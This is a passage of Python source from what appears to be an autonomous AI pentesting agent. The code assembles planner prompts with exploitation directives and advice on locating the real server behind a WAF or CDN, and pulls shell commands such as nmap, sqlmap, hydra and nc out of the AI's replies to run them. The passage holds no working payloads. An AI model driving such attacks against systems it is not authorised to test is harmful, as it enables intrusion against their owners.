            forbidden.append(f"BANNED categories: {sorted(self._banned_categories)}")
        if self._banned_plan_categories:
            forbidden.append(f"BANNED plan categories: {sorted(self._banned_plan_categories)}")
        if self._dead_branches:
            forbidden.append(f"DEAD BRANCHES: {sorted(self._dead_branches)}")
        if self._exhausted_techniques:
            forbidden.append(f"EXHAUSTED techniques: {sorted(self._exhausted_techniques)}")
        if self._terminated_vectors:
            forbidden.append(f"TERMINATED vectors: {len(self._terminated_vectors)}")
        if self._hypotheses:
            dead = [k for k, v in self._hypotheses.items() if v.state == HYP_STATE_DEAD]
            if dead:
                forbidden.append(f"DEAD hypotheses (can only retest with NEW evidence): {dead}")
            rejected = [k for k, v in self._hypotheses.items() if v.state == HYP_STATE_REJECTED]
            if rejected:
                forbidden.append(f"REJECTED hypotheses: {rejected}")
        hard_limited = {k: v for k, v in self._category_hard_limits.items() if v >= 4}
        if hard_limited:
            forbidden.append(f"HARD-LIMITED categories (>=5 will be blocked): {hard_limited}")
        if forbidden:
            ctx += "\n[!] FORBIDDEN (system WILL block these):\n" + "\n".join(f"  - {f}" for f in forbidden) + "\n"

        if anti_loop:
            ctx += "\n[!] ANTI-LOOP WARNINGS (read carefully):\n" + "\n".join(anti_loop) + "\n"

        ranked = self._ranked_assets_block()
        if ranked:
            ctx += "\n" + ranked + "\n"

        analysis = self._strategic_analysis()
        if analysis:
            ctx += "\nANALYSIS (strategic assessment — read before acting):\n" + analysis + "\n"

        hyps = self._finding_hypotheses()
        if hyps:
            ctx += "\nHYPOTHESES (act on these instead of re-scanning):\n" + "\n".join(f"  - {h}" for h in hyps) + "\n"
        struct_hyps = self._generate_structured_hypotheses()
        if struct_hyps:
            ctx += "\nSTRUCTURED HYPOTHESES (engine-generated — run these commands):\n"
            for sh in struct_hyps[:6]:
                status = " [TESTED]" if sh.tested else ""
                ctx += f"  [{sh.priority:.1f}] {sh.service}:{sh.port} — {sh.technique}{status}\n"
                ctx += f"       cmd: {sh.command[:100]}\n"
                ctx += f"       -> {sh.expected[:80]}\n"
        testable = [h for h in self._hypotheses.values() if h.state in (HYP_STATE_NEW, HYP_STATE_TESTING)]
        if testable:
            ctx += "\nTESTABLE HYPOTHESES (scores, active):\n"
            for h in sorted(testable, key=lambda x: x.score, reverse=True):
                title = h.key.split(":", 1)[-1].replace("_", " ")
                ctx += f"  [{h.score:.1f}] {title} (attempts={h.attempts})\n"
        confirmed_hyps = [k.split(":", 1)[-1].replace("_", " ") for k, v in self._hypotheses.items() if v.state == HYP_STATE_CONFIRMED]
        if confirmed_hyps:
            ctx += "CONFIRMED VULNERABILITIES (exploit these): " + "; ".join(confirmed_hyps) + "\n"
        dead = [k.split(":", 1)[-1].replace("_", " ") for k, v in self._hypotheses.items() if v.state == HYP_STATE_DEAD]
        if dead:
            ctx += "DEAD HYPOTHESES (do not retest without new evidence): " + "; ".join(dead) + "\n"

        teff = self._tool_effectiveness_block()
        if teff:
            ctx += "\n" + teff + "\n"

        sat = self._recon_saturation()
        ctx += (f"\nRECON SATURATION: pivot_score={sat['pivot_score']:.0f}% duplicates={sat['duplicates']} "
                f"exhausted_endpoints={sat['exhausted_endpoints']} saturated={sat['saturated']}\n")
        if self._exhausted_techniques:
            ctx += f"EXHAUSTED TECHNIQUES (never reuse these): {', '.join(sorted(self._exhausted_techniques))}\n"
        if self._terminated_vectors:
            ctx += ("TERMINATED VECTORS (same HTTP code 3x — do NOT retry these URLs/payload classes): "
                    + ", ".join(f"{k}={v}" for k, v in self._terminated_vectors) + "\n")
        hyp_ctx = self._hypothesis_context_block()
        if hyp_ctx:
            ctx += "\n" + hyp_ctx + "\n"
        if self._cloudflare:
            vendor = self._waf_vendor or "WAF"
            ctx += (
                f"\n[!] {vendor} WAF/CDN DETECTED — your HTTP probes are being intercepted.\n"
                f"FORBIDDEN CATEGORIES RIGHT NOW: port_scan, web_dirbust, web_scanner, fingerprint "
                f"(running these wastes the entire iteration, the WAF returns 403/Access Denied).\n"
                f"REQUIRED PIVOT — pick at least one of these instead:\n"
                f"  • subdomain_recon: subfinder, assetfinder, amass, sublist3r, findomain — find sibling hosts not behind the CDN\n"
                f"  • dns_recon: dig, host, nslookup — look for mail/origin/A records bypassing the CDN\n"
                f"  • web_exploit (CVE-driven): nuclei (with WAF-bypass templates), wpscan, ssrf-king\n"
                f"  • historical_data: waybackurls, gau, otxurls, cvesearch — old endpoints before WAF was added\n"
                f"  • origin_ip: censys, shodan, viewdns.info, crimeflare — find the real IP behind {vendor}\n"
                f"Failure to pivot = session stuck. DO NOT run nmap/curl/gobuster against the WAF front.\n"
            )
        if sat["saturated"]:
            ctx += "[!] RECON SATURATED — STOP recon. Choose a fundamentally different strategy NOW.\n"

        cons = self._active_constraints()  # req 6,7,8: hard constraints from prior conclusions
        if cons:
            ctx += "\nACTIVE CONSTRAINTS (HARD RULES — your plan MUST obey these, do not propose prohibited actions):\n"
            for c in cons:
                ctx += f"  - {c['conclusion']} [evidence: {c['evidence'][:90]}; expires: {c['expires']}]\n"

        # Phase enforcement: show current phase, tool limits, and stuck status
        ctx += f"\nPHASE STATE: {self._phase_context()}\n"

        # Tool-awareness: show what's actually available vs what the planner keeps suggesting
        tool_ctx = self._installed_tools_context()
        if tool_ctx:
            ctx += f"\nTOOL AVAILABILITY:\n{tool_ctx}\n"

        # Inject relevant memories from ChromaDB so the planner reuses past learning.
        if self.memory.ready:
            mem_parts = []
            # Query techniques relevant to services found
            services = {
                str(p["port"]): f"{p.get('service', '')} {p.get('version', '')}".strip()
                for p in model.ports
            }
            svc_names = [v for v in services.values() if v][:3]
            for svc in svc_names:
                for t in self.memory.query("techniques", f"hacking {svc}", n=2):
                    mem_parts.append(f"  [PAST TECHNIQUE] {t['text'][:200]}")
            # Recently learned CVEs relevant to the target/stack
            for c in self.memory.query("cves", f"{target} {' '.join(svc_names)} vulnerability", n=3):
                mem_parts.append(f"  [CVE] {c['text'][:200]}")
            # Recent lessons
            for les in self.memory.query("lessons", f"pentesting {target} {' '.join(svc_names)}", n=3):
                mem_parts.append(f"  [PAST LESSON] [{les['metadata'].get('severity','info').upper()}] {les['text'][:200]}")
            if not fast:
                for p in self.memory.query("profile", "user preferences pentesting", n=2):
                    mem_parts.append(f"  [ABOUT USER] {p['text'][:200]}")
            if mem_parts:
                fresh = []
                for p in mem_parts:
                    mid = hashlib.md5(p.encode()).hexdigest()[:12]
                    if mid not in self._seen_memory_ids:
                        self._seen_memory_ids.add(mid)
                        fresh.append(p)
                if fresh:
                    print(f"{C.G}[+] Memory hit: retrieved {len(fresh)} new record(s) (technique/CVE/lesson){C.N}")
                    ctx += "\nRELEVANT MEMORIES (from past sessions & learning):\n" + "\n".join(fresh[:6]) + "\n"

        if self._proxy_active:  # feed Burp/mitm captured traffic to the planner (incl. fast/bounty mode)
            traffic_ctx = self.proxy.traffic_context()
            if traffic_ctx:
                ctx += f"\n{traffic_ctx[:1500]}\n"

        if not fast:
            datasets = DataManager.context_block()
            if datasets:
                ctx += f"\n{datasets}\n"

        # PoC chain summary (when active)
        if self._poc_mode and self.poc_chain:
            ctx += "\nPoC CHAIN (recorded steps):\n"
            for entry in self.poc_chain[-8:]:
                ctx += f"  #{entry['step']} [{entry['category']}] {entry['action'][:120]}\n"
            if self._exploitation_success:
                ctx += "\n[!] EXPLOITATION SUCCEEDED — finalize PoC, then set completed:true\n"

        if not fast:
            ctx += "\nSELF-CRITIQUE: Did the last command give NEW information? If not, pivot.\n"

        # X19_INTELLIGENCE: inject the semantic analysis of the last output
        # (system-interpreted, not just hashes). The AI can trust this and base
        # its reasoning on real semantics, not on pattern-matching.
        sem_block = self._format_semantic_for_context()
        if sem_block:
            ctx += "\n" + sem_block + "\n"

        ctx += "\nRespond with JSON only."

        # PROMPT SIZE CAP — Groq's per-request input limit can hit 413 on long
        # sessions. ~3 chars/token, so 24000 chars ≈ 8k tokens which fits Groq's
        # tightest free-tier cap with headroom for system prompt + output.
        # Keep the TAIL (most recent recon, last output, anti-loop warnings) —
        # the system prompt is sent separately, so dropping the head is safe.
        PROMPT_CHAR_CAP = 48000
        if len(ctx) > PROMPT_CHAR_CAP:
            trimmed = len(ctx) - PROMPT_CHAR_CAP
            head_keep = PROMPT_CHAR_CAP // 4  # keep some of the early goals
            tail_keep = PROMPT_CHAR_CAP - head_keep - 80
            print(f"{C.Y}[!] Prompt trimmed: {len(ctx)}→{PROMPT_CHAR_CAP} chars "
                  f"(-{trimmed}) to fit model input limit{C.N}")
            ctx = (ctx[:head_keep]
                   + "\n[...middle of session context truncated to fit model input...]\n"
                   + ctx[-tail_keep:])
        return ctx

    def _parse_decision(self, raw: str) -> Optional[Dict]:
        from brain.decision_parser import parse_decision
        return parse_decision(raw)

    def _extract_prose_command(self, raw: str) -> str:
        """Last-resort: pull a single shell command out of free-form AI prose.
        Looks for EXEC: directives, fenced code blocks, and the first plausible
        nmap/curl/etc. invocation in the response."""
        if not raw:
            return ""
        # 1) EXEC: directive (line-based)
        for line in raw.splitlines():
            s = line.strip()
            if s.upper().startswith("EXEC:"):
                cmd = s.split(":", 1)[1].strip()
                if cmd:
                    return cmd
        # 2) Fenced bash/sh code block — take the first non-empty line
        for fence in ("```bash", "```sh", "```shell", "```"):
            m = re.search(re.escape(fence) + r"\s*\n(.*?)```", raw, re.DOTALL | re.IGNORECASE)
            if m:
                for line in m.group(1).splitlines():
                    s = line.strip()
                    if s and not s.startswith("#"):
                        return s
        # 3) Inline backticked command
        bticks = re.findall(r'`([^`\n]{8,400})`', raw)
        for cand in bticks:
            s = cand.strip().strip("$").strip()
            if re.match(r'^(nmap|curl|wget|httpx|sqlmap|nuclei|ffuf|gobuster|feroxbuster|whatweb|masscan|rustscan|hydra|nc|cat|ls|cd|bash|sh|python|python3)\s', s, re.IGNORECASE):
                return s
        return ""

    def _normalize_decision(self, d) -> Optional[Dict]:
        """Validate planner output shape; coerce/reject so malformed JSON can't crash the loop."""
        if not isinstance(d, dict) or "completed" not in d:
            return None
        d["completed"] = bool(d.get("completed"))
        nc = d.get("next_command")
        d["next_command"] = nc.strip() if isinstance(nc, str) else ""
        if not isinstance(d.get("finding"), dict):
            d["finding"] = None
        if not isinstance(d.get("plan"), dict):
            d["plan"] = None
        for k in ("thinking", "think", "reasoning", "strategy", "pivot_reason"):
            v = d.get(k)
            d[k] = v if isinstance(v, str) else ("" if v is None else str(v))
        # Track strategy changes — if AI keeps the same strategy for 3+ turns, it's looping.
        if d.get("strategy"):
            if not hasattr(self, "_strategy_history"):
                self._strategy_history = []
            self._strategy_history.append(d["strategy"])
            self._strategy_history = self._strategy_history[-6:]
            if len(self._strategy_history) >= 3 and len(set(self._strategy_history[-3:])) == 1:
                # AI is stuck on same strategy without pivot
                d["pivot_reason"] = (d.get("pivot_reason") or "") + " [SYSTEM: same strategy 3x, MUST pivot]"
        return d

    def _parse_ports(self, output: str) -> List[Dict]:
        from parsers.nmap import NmapParser
        return NmapParser().parse("", output)

    def _estimate_timeout(self, cmd: str) -> int:
        for name, entry in TOOLS.items():
            cmd_part = entry.rsplit("|", 2)[0].strip()
            tokens = cmd_part.split()
            first_token = tokens[0] if tokens else ""
            if name in cmd or first_token in cmd:
                parts = entry.rsplit("|", 2)
                if len(parts) > 2:
                    try:
                        return int(parts[2].strip())
                    except ValueError:
                        pass
        return CONFIG.TIMEOUT_DEFAULT

    def _save_report(self, report: str):
        if not self.session.id:
            return
        path = Path(CONFIG.SESSIONS_DIR) / f"{self.session.id}_report.txt"
        path.write_text(report)
        print(f"{C.G}[+] Report: {path}{C.N}")

    def findings(self) -> List["Finding"]:
        return self.model.findings
